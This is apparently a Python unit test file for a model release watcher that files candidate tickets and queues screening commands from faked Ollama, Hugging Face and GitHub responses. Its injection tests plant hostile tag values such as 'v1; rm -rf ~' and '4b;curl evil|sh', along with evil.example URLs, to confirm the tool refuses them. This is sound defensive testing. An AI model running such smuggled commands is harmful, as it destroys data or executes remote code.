"""Release watch (localbench/releasewatch.py): candidate beads and queued screens from fake Ollama library, registry,
Hugging Face and GitHub responses. Every run uses a temp HOME and a fake `br`; nothing touches the network, beads or
launchd."""

from __future__ import annotations

import hashlib
import json
import plistlib
import shlex
import subprocess
import tempfile
import unittest
import urllib.parse
from datetime import UTC, datetime
from pathlib import Path

from localbench import models, releasewatch as rw

NOW = datetime(2026, 9, 30, 6, 17, tzinfo=UTC)
GB = 10**9


class World:
    """Fake upstreams, routed by URL the way the real endpoints are shaped. `down` lists URL prefixes that answer
    like a dead network (status 0)."""

    def __init__(self):
        # name -> tag -> (manifest key, weight bytes); tags sharing a key share one manifest (aliases).
        self.ollama = {"nimble": {"latest": ("nimble-9b", 6 * GB)},
                       "tev1": {"latest": ("tev1-4b", 4 * GB), "0.8b": ("tev1-08b", GB)},
                       "qwen3.8": {"27b-mlx": ("q38-27b", 17 * GB)},
                       "bge-m3": {"latest": ("bge-m3", GB)}}
        self.listed_only = ["llama4"]          # on the library page, out of every family
        self.hf = {"mlx-community": [("mlx-community/Qwen3.8-27B-4bit", "a" * 40, 15 * GB)],
                   "Qdrant": [("Qdrant/bge-base-en-v1.5-onnx-Q", "b" * 40, GB // 4)]}
        self.github = {"ollama/ollama": [("v0.35.0", False)], "ddalcu/mlx-serve": [("v26.9.6", False)],
                       "jundot/omlx": [("v0.7.0", False)]}
        self.mismatch: set[str] = set()        # manifest keys whose registry body differs from the library page
        self.html_url: dict[str, str] = {}     # tag -> release page URL override
        self.asset_url: dict[str, str] = {}    # tag -> mlx-serve asset URL override
        self.down: list[str] = []
        self.calls: list[str] = []

    def manifest(self, key: str, size: int, served: bool = False) -> bytes:
        tail = "-repushed" if served and key in self.mismatch else ""
        return json.dumps({"schemaVersion": 2, "layers": [{"digest": f"sha256:{key}{tail}", "size": size}]}).encode()

    def digest12(self, key: str, size: int) -> str:
        return hashlib.sha256(self.manifest(key, size)).hexdigest()[:12]

    def tags_html(self, name: str) -> str:
        rows = []
        for tag, (key, size) in self.ollama[name].items():
            row = (f'<a href="/library/{name}:{tag}" class="md:hidden flex"><span>{name}:{tag}</span>'
                   f'<span class="font-mono"> {self.digest12(key, size)}</span> \u2022 {size / GB:.1f}GB \u2022 '
                   f'Text input</a>')
            rows += [row, row.replace('class="md:hidden flex"', 'class="hidden md:flex"')]
        rows.append(f'<a href="/library/{name}:cloud" class="md:hidden"><span>{name}:cloud</span> \u2022 -</a>')
        return "<html>" + "\n".join(rows) + "</html>"

    def __call__(self, url: str, headers: dict | None = None, timeout: float = 15) -> tuple[int, bytes]:
        self.calls.append(url)
        if any(url.startswith(p) for p in self.down):
            return 0, b""
        if url.startswith(rw.OLLAMA_LIBRARY + "?"):
            names = [*self.ollama, *self.listed_only]
            return 200, "".join(f'<a href="/library/{n}">{n}</a>' for n in names).encode()
        if url.startswith(rw.OLLAMA_LIBRARY + "/"):
            name = url[len(rw.OLLAMA_LIBRARY) + 1:].removesuffix("/tags")
            return (200, self.tags_html(name).encode()) if name in self.ollama else (404, b"")
        if url.startswith(models.REGISTRY + "/library/"):
            name, tag = url[len(models.REGISTRY) + 9:].split("/manifests/")
            key, size = self.ollama[name][tag]
            return 200, self.manifest(key, size, served=True)
        if url.startswith(models.HF_API + "?"):
            q = urllib.parse.parse_qs(urllib.parse.urlparse(url).query)
            author, search = q["author"][0], q["search"][0].lower()
            rows = [{"id": r, "sha": s, "lastModified": "2026-09-29T00:00:00.000Z", "pipeline_tag": "text-generation"}
                    for r, s, _ in self.hf.get(author, []) if search in r.lower()]
            return 200, json.dumps(rows).encode()
        if url.startswith(models.HF_API + "/"):
            repo = url[len(models.HF_API) + 1:].removesuffix("?blobs=true")
            for r, sha, size in (x for rows in self.hf.values() for x in rows):
                if r == repo:
                    return 200, json.dumps({"id": r, "sha": sha, "siblings": [
                        {"rfilename": "config.json", "size": 2000},
                        {"rfilename": "model-00001-of-00002.safetensors", "size": size - size // 2},
                        {"rfilename": "model-00002-of-00002.safetensors", "size": size // 2}]}).encode()
            return 404, b""
        if url.startswith(rw.GITHUB_API + "/"):
            repo, _, rest = url[len(rw.GITHUB_API) + 1:].partition("/releases")
            if rest:
                return 200, json.dumps([
                    {"tag_name": t, "prerelease": pre, "draft": False,
                     "html_url": self.html_url.get(t, f"https://github.com/{repo}/releases/tag/{t}"),
                     "assets": [{"name": rw.MLX_SERVE_ASSET, "browser_download_url": self.asset_url.get(
                         t, f"https://github.com/{repo}/releases/download/{t}/a.tgz")}]}
                    for t, pre in self.github[repo]]).encode()
            repo, tag = url[len(rw.GITHUB_API) + 1:].split("/commits/")
            return 200, json.dumps({"sha": hashlib.sha1(f"{repo}@{tag}".encode()).hexdigest()}).encode()
        return 404, b""


class FakeBr:
    def __init__(self, fail: bool = False):
        self.calls: list[list[str]] = []
        self.fail = fail

    def __call__(self, argv: list[str]) -> tuple[int, str, str]:
        self.calls.append(argv)
        if self.fail:
            return 1, "", "database is locked"
        return 0, f"kit-cand-{len(self.calls)}\n", "INFO fsqlite noise\n"

    def field(self, i: int, flag: str) -> str:
        argv = self.calls[i]
        return argv[argv.index(flag) + 1]


class Home:
    def __init__(self, sub: str = ""):
        self._tmp = tempfile.TemporaryDirectory()
        self.path = Path(self._tmp.name) / sub if sub else Path(self._tmp.name)
        self.path.mkdir(exist_ok=True)
        self.dir = self.path / ".localbench" / "watch"

    def run(self, world: World, br: FakeBr, **kw) -> dict:
        return rw.run_once(fetch=world, br=br, now=NOW, home=self.path, publishers=("mlx-community",), **kw)

    def files(self) -> dict[str, bytes | None]:
        names = ("seen.json", "queue.json")
        return {n: (self.dir / n).read_bytes() if (self.dir / n).exists() else None for n in names}

    def queue(self) -> list[dict]:
        path = self.dir / "queue.json"
        return json.loads(path.read_text())["entries"] if path.exists() else []

    def seen(self) -> dict:
        return json.loads((self.dir / "seen.json").read_text())["items"]

    def close(self):
        self._tmp.cleanup()


class WatchCase(unittest.TestCase):
    HOME_SUB = ""

    def setUp(self):
        self.home = Home(self.HOME_SUB)
        self.addCleanup(self.home.close)
        self.world = World()
        baseline = self.home.run(self.world, FakeBr())
        self.assertTrue(baseline["ok"], baseline["errors"])


class Baseline(unittest.TestCase):
    def test_first_run_records_everything_listed_without_filing_and_a_dead_network_writes_nothing(self):
        home = Home()
        self.addCleanup(home.close)
        dead, br = World(), FakeBr()
        dead.down = ["https://"]
        report = home.run(dead, br)
        self.assertFalse(report["ok"])
        self.assertTrue(report["errors"])
        self.assertEqual(home.files(), {"seen.json": None, "queue.json": None})

        report = home.run(World(), br)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(br.calls, [])
        self.assertEqual(report["filed"], [])
        self.assertEqual(home.queue(), [])
        # tev1 has two manifests; aliases and the cloud row are not separate items.
        self.assertEqual(report["baselined"], len(home.seen()))
        self.assertIn("ollama:tev1@" + World().digest12("tev1-4b", 4 * GB), home.seen())
        self.assertIn("github:ddalcu/mlx-serve@v26.9.6", home.seen())
        self.assertFalse(any(k.startswith("ollama:llama4") for k in home.seen()))


class NewRelease(WatchCase):
    def test_new_decision_family_files_one_bead_and_one_queue_entry_then_nothing_when_seen_again(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB), "4b": ("tev2-4b", 5 * GB)}
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(len(br.calls), 1)
        entry, = self.home.queue()
        full = hashlib.sha256(self.world.manifest("tev2-4b", 5 * GB)).hexdigest()
        self.assertEqual((entry["bead"], entry["role"], entry["digest"], entry["size"]),
                         ("kit-cand-1", "decision", f"sha256:{full}", 5 * GB))
        self.assertEqual(entry["source"], "https://ollama.com/library/tev2:latest")
        self.assertEqual(entry["pull"], [["localbench", "pull", "ollama:tev2:latest"]])
        self.assertEqual(entry["screen"], ["localbench", "decision", "run", "ollama:tev2:latest",
                                           "--suite", rw.DECISION_SUITE, "--feature", rw.DECISION_FEATURE])
        desc = br.field(0, "--description")
        for needle in ("role: decision", "https://ollama.com/library/tev2:latest", f"sha256:{full}", "5.00 GB",
                       shlex.join(entry["screen"]), "never adopt"):
            self.assertIn(needle, desc)
        self.assertEqual(br.field(0, "--external-ref"), entry["source"])

        before = self.home.files()
        again = FakeBr()
        report = self.home.run(self.world, again)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual((again.calls, report["filed"], report["deferred"]), ([], [], []))
        self.assertEqual(self.home.files(), before)

    def test_new_tag_of_a_baselined_family_is_a_candidate_but_a_new_alias_of_a_known_manifest_is_not(self):
        self.world.ollama["tev1"]["4b"] = ("tev1-4b", 4 * GB)
        self.world.ollama["tev1"]["4b-q4_K_M"] = ("tev1-4b-q4", 3 * GB)
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertEqual([e["id"] for e in report["filed"]],
                         ["ollama:tev1@" + self.world.digest12("tev1-4b-q4", 3 * GB)])
        self.assertIn("ollama:tev1:4b-q4_K_M", self.home.queue()[0]["screen"])

    def test_an_id_already_in_the_queue_is_not_filed_again_when_its_seen_record_was_lost(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.home.run(self.world, FakeBr())
        state = json.loads((self.home.dir / "seen.json").read_text())
        state["items"] = {k: v for k, v in state["items"].items() if not k.startswith("ollama:tev2")}
        (self.home.dir / "seen.json").write_text(json.dumps(state))
        br = FakeBr()
        self.home.run(self.world, br)
        self.assertEqual(br.calls, [])
        self.assertEqual(len(self.home.queue()), 1)

    def test_runtime_releases_stable_only_mlx_serve_queued_with_commit_ollama_filed_without_a_screen(self):
        self.world.github["ddalcu/mlx-serve"].insert(0, ("v26.9.7", False))
        self.world.github["jundot/omlx"].insert(0, ("v0.7.1rc1", False))
        self.world.github["ollama/ollama"][:0] = [("v0.35.2-rc0", True), ("v0.35.1", False)]
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(sorted(e["id"] for e in report["filed"]),
                         ["github:ddalcu/mlx-serve@v26.9.7", "github:ollama/ollama@v0.35.1"])
        entry, = self.home.queue()
        self.assertEqual(entry["commit"], hashlib.sha1(b"ddalcu/mlx-serve@v26.9.7").hexdigest())
        d = self.home.path / ".localbench" / "mlx-serve-26.9.7"
        self.assertEqual(entry["screen"][-2:], ["--b-mlx-serve", str(d / "mlx-serve-macos-arm64" / "mlx-serve")])
        ollama, = [e for e in report["filed"] if e["id"].startswith("github:ollama")]
        self.assertEqual((ollama["status"], ollama["screen"]), ("filed", None))
        self.assertEqual(self.home.seen()["github:ollama/ollama@v0.35.1"]["outcome"], "filed")


class Bounds(WatchCase):
    def test_family_table_scope(self):
        for name, role in (("tev1", "decision"), ("tev2", "decision"), ("nimble", "decision"),
                           ("nimble2-mini", "decision"), ("tevatron", None), ("qwen3.8", "extraction"),
                           ("qwen3.8-flash-next", "extraction"), ("mlx-community/Qwen3.9-8B-4bit", "extraction"),
                           ("qwen3-embedding", None), ("qwen3-coder", None), ("qwen3-vl", None),
                           ("bge-m3", "embedding"), ("Qdrant/bge-base-en-v1.5-onnx-Q", "embedding"),
                           ("BAAI/BGE-VL-MLLM-S2", None), ("Alibaba-NLP/gte-multilingual-reranker-base", None),
                           ("nomic-embed-text", "embedding"), ("gte-qwen2", "embedding"), ("llama4", None),
                           ("mxbai-embed-large", None)):
            with self.subTest(name=name):
                self.assertEqual(rw.role_of(name), role)

    def test_out_of_scope_family_is_never_fetched_and_oversize_models_are_marked_seen_not_queued(self):
        self.world.listed_only.append("llama5")
        self.world.ollama["qwen3.9"] = {"8b": ("q39-8b", 6 * GB), "235b": ("q39-235b", 140 * GB)}
        self.world.ollama["llama5"] = {"latest": ("l5", 4 * GB)}
        self.world.hf["mlx-community"] += [("mlx-community/Qwen3.9-235B-A22B-4bit", "c" * 40, 130 * GB),
                                           ("mlx-community/Llama5-8B-4bit", "d" * 40, 5 * GB)]
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=5)
        self.assertTrue(report["ok"], report["errors"])
        self.assertFalse(any("llama5" in u.lower() for u in self.world.calls))
        self.assertEqual([e["id"] for e in report["filed"]],
                         ["ollama:qwen3.9@" + self.world.digest12("q39-8b", 6 * GB)])
        self.assertEqual(self.home.queue()[0]["screen"],
                         ["localbench", "ab", rw.SMOL_INCUMBENT, "ollama:qwen3.9:8b", *rw.SCREEN_AB])
        self.assertEqual(sorted(s["id"] for s in report["skipped"]),
                         ["hf:mlx-community/Qwen3.9-235B-A22B-4bit",
                          "ollama:qwen3.9@" + self.world.digest12("q39-235b", 140 * GB)])
        self.assertEqual(self.home.seen()["hf:mlx-community/Qwen3.9-235B-A22B-4bit"]["outcome"], "oversize")
        self.assertEqual(len(br.calls), 1)

        self.world.calls.clear()
        self.home.run(self.world, br, max_queued=5)
        self.assertEqual(len(br.calls), 1)
        self.assertFalse(any("manifests" in u or "blobs" in u for u in self.world.calls))

    def test_queue_cap_defers_without_marking_seen_and_files_once_the_window_takes_the_queue(self):
        self.world.ollama["qwen3.9"] = {"4b": ("q39-4b", 3 * GB), "8b": ("q39-8b", 6 * GB), "14b": ("q39-14b", 9 * GB)}
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertEqual((len(report["filed"]), len(report["deferred"])), (2, 1))
        self.assertEqual(len(self.home.queue()), rw.MAX_QUEUED)
        deferred = report["deferred"][0]["id"]
        self.assertNotIn(deferred, self.home.seen())

        report = self.home.run(self.world, br)
        self.assertEqual((len(br.calls), [d["id"] for d in report["deferred"]]), (2, [deferred]))

        queue = json.loads((self.home.dir / "queue.json").read_text())
        for e in queue["entries"]:
            e["status"] = "screened"
        (self.home.dir / "queue.json").write_text(json.dumps(queue))
        report = self.home.run(self.world, br)
        self.assertEqual([e["id"] for e in report["filed"]], [deferred])
        self.assertEqual(len(br.calls), 3)

    def test_unscreenable_candidates_are_filed_but_do_not_take_queue_slots(self):
        # The screenable one comes first and fills the one-slot queue; the embedding after it must still be filed.
        self.world.ollama["qwen3.9"] = {"4b": ("q39-4b", 3 * GB)}
        self.world.ollama["bge-m4"] = {"latest": ("bge-m4", GB)}
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=1)
        self.assertEqual(sorted(e["role"] for e in report["filed"]), ["embedding", "extraction"])
        self.assertEqual([e["role"] for e in self.home.queue()], ["extraction"])
        self.assertEqual(report["deferred"], [])


class Failures(WatchCase):
    def test_dead_network_changes_no_state_and_reports_errors(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.world.down = ["https://"]
        before = self.home.files()
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertGreaterEqual(len(report["errors"]), 3)
        self.assertEqual((br.calls, report["filed"]), ([], []))
        self.assertEqual(self.home.files(), before)

    def test_a_new_family_whose_tags_fail_stays_new_until_they_load(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.world.down = [f"{rw.OLLAMA_LIBRARY}/tev2/"]
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertEqual(br.calls, [])
        self.world.down = []
        report = self.home.run(self.world, br)
        self.assertEqual([e["id"] for e in report["filed"]], ["ollama:tev2@" + self.world.digest12("tev2-4b", 5 * GB)])

    def test_one_dead_source_does_not_hide_its_releases_once_it_is_back(self):
        self.world.hf["mlx-community"].append(("mlx-community/Qwen3.9-8B-4bit", "e" * 40, 5 * GB))
        self.world.down = [models.HF_API]
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertEqual(br.calls, [])
        self.world.down = []
        report = self.home.run(self.world, br)
        entry, = self.home.queue()
        self.assertEqual((entry["id"], entry["commit"], entry["size"]), ("hf:mlx-community/Qwen3.9-8B-4bit", "e" * 40,
                                                                          5 * GB))
        self.assertIn(f"mlx-serve:{self.home.path}/.mlx-serve/models/mlx-community/Qwen3.9-8B-4bit", entry["screen"])

    def test_br_failure_leaves_the_candidate_unseen_and_unqueued_for_the_next_run(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        report = self.home.run(self.world, FakeBr(fail=True))
        self.assertFalse(report["ok"])
        self.assertIn("database is locked", report["errors"][0])
        self.assertEqual(self.home.queue(), [])
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertEqual((len(br.calls), len(self.home.queue())), (1, 1))

    def test_registry_manifest_that_disagrees_with_the_library_page_is_an_error_not_a_candidate(self):
        self.world.ollama["tev2"] = {"latest": ("tev2-4b", 5 * GB)}
        self.world.mismatch.add("tev2-4b")
        br = FakeBr()
        report = self.home.run(self.world, br)
        self.assertFalse(report["ok"])
        self.assertIn("is not the library page's", report["errors"][0])
        self.assertEqual((br.calls, self.home.queue()), ([], []))
        self.assertFalse(any(k.startswith("ollama:tev2") for k in self.home.seen()))

    def test_state_inside_a_git_work_tree_is_refused_before_anything_is_written(self):
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / ".git").mkdir()
            br = FakeBr()
            report = rw.run_once(fetch=World(), br=br, now=NOW, home=Path(tmp), publishers=())
            self.assertFalse(report["ok"])
            self.assertIn("git work tree", report["errors"][0])
            self.assertFalse((Path(tmp) / ".localbench").exists())


class Injection(WatchCase):
    """Upstream names, tags and URLs reach queued commands and paths; the home has a space so quoting shows."""
    HOME_SUB = "my home"

    def test_upstream_strings_outside_the_safe_patterns_are_refused_never_fetched_filed_or_queued(self):
        self.world.github["ddalcu/mlx-serve"][:0] = [("v1; rm -rf ~", False), ("v26.9.8", False)]
        self.world.asset_url["v26.9.8"] = "https://evil.example/ddalcu/mlx-serve/releases/download/v26.9.8/a.tgz"
        self.world.github["ollama/ollama"].insert(0, ("v0.35.1", False))
        self.world.html_url["v0.35.1"] = "https://github.com.evil.example/ollama/ollama/releases/tag/v0.35.1"
        self.world.ollama["tev1"]["4b;curl evil|sh"] = ("tev1-evil", GB)
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=5)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual((br.calls, report["filed"], self.home.queue()), ([], [], []))
        reasons = {s["id"]: s["reason"] for s in report["skipped"]}
        evil_tev1 = "ollama:tev1@" + self.world.digest12("tev1-evil", GB)
        self.assertEqual(set(reasons), {"github:ddalcu/mlx-serve@v1; rm -rf ~", "github:ddalcu/mlx-serve@v26.9.8",
                                        "github:ollama/ollama@v0.35.1", evil_tev1})
        self.assertTrue(reasons["github:ddalcu/mlx-serve@v1; rm -rf ~"].startswith("refused: unsafe tag"))
        self.assertTrue(reasons[evil_tev1].startswith("refused: unsafe tag"))
        self.assertTrue(reasons["github:ddalcu/mlx-serve@v26.9.8"].startswith("refused: unsafe asset url"))
        self.assertTrue(reasons["github:ollama/ollama@v0.35.1"].startswith("refused: unsafe url"))
        self.assertEqual({self.home.seen()[i]["outcome"] for i in reasons}, {"refused"})
        self.assertFalse(any("rm -rf" in u or "curl evil" in u or "/commits/" in u for u in self.world.calls))

        report = self.home.run(self.world, br, max_queued=5)
        self.assertEqual((br.calls, report["skipped"], report["errors"]), ([], [], []))

    def test_queued_commands_are_argv_lists_and_beads_show_them_shell_quoted(self):
        self.world.hf["mlx-community"].append(("mlx-community/Qwen3.9-8B-4bit", "e" * 40, 5 * GB))
        self.world.github["ddalcu/mlx-serve"].insert(0, ("v26.9.7", False))
        br = FakeBr()
        report = self.home.run(self.world, br, max_queued=5)
        self.assertTrue(report["ok"], report["errors"])
        by_id = {e["id"]: e for e in self.home.queue()}
        target = self.home.path / ".mlx-serve" / "models" / "mlx-community" / "Qwen3.9-8B-4bit"
        hf = by_id["hf:mlx-community/Qwen3.9-8B-4bit"]
        self.assertEqual(hf["pull"], [["localbench", "pull", "hf:mlx-community/Qwen3.9-8B-4bit", "--to", str(target)]])
        self.assertEqual(hf["screen"], ["localbench", "ab", rw.SMOL_INCUMBENT, f"mlx-serve:{target}", *rw.SCREEN_AB])
        d = self.home.path / ".localbench" / "mlx-serve-26.9.7"
        asset = "https://github.com/ddalcu/mlx-serve/releases/download/v26.9.7/a.tgz"
        self.assertEqual(by_id["github:ddalcu/mlx-serve@v26.9.7"]["pull"],
                         [["mkdir", "-p", str(d)], ["curl", "-fL", "-o", str(d / rw.MLX_SERVE_ASSET), asset],
                          ["tar", "-xzf", str(d / rw.MLX_SERVE_ASSET), "-C", str(d)]])
        desc = br.field([i for i, a in enumerate(br.calls) if "Qwen3.9" in a[a.index("--title") + 1]][0],
                        "--description")
        self.assertIn(f"Stage-1 screen: {shlex.join(hf['screen'])}", desc)
        self.assertIn(shlex.quote(f"mlx-serve:{target}"), desc)
        self.assertEqual(shlex.split(desc.split("Stage-1 screen: ", 1)[1].splitlines()[0]), hf["screen"])


class LaunchAgent(unittest.TestCase):
    def test_daily_agent_runs_one_pass_and_install_refuses_a_foreign_plist(self):
        with tempfile.TemporaryDirectory() as tmp:
            home = Path(tmp)
            doc = rw.launchd_plist(home, "/py")
            self.assertEqual(doc["ProgramArguments"], ["/py", "-m", "localbench", "watch-releases", "--once"])
            self.assertEqual(set(doc["StartCalendarInterval"]), {"Hour", "Minute"})
            self.assertNotIn("StartInterval", doc)
            self.assertNotIn("KeepAlive", doc)
            calls = []

            def run(argv, **kw):
                calls.append(argv)
                return subprocess.CompletedProcess(argv, 0, "", "")

            path = rw.install_agent(home, "/py", run=run)
            self.assertEqual(plistlib.loads(path.read_bytes()), doc)
            self.assertEqual(calls[-1][:2], ["launchctl", "bootstrap"])
            path.write_bytes(plistlib.dumps({"Label": "com.example.other"}))
            calls.clear()
            with self.assertRaises(rw.WatchError):
                rw.install_agent(home, "/py", run=run)
            self.assertEqual(calls, [])
            self.assertEqual(plistlib.loads(path.read_bytes())["Label"], "com.example.other")


if __name__ == "__main__":
    unittest.main()
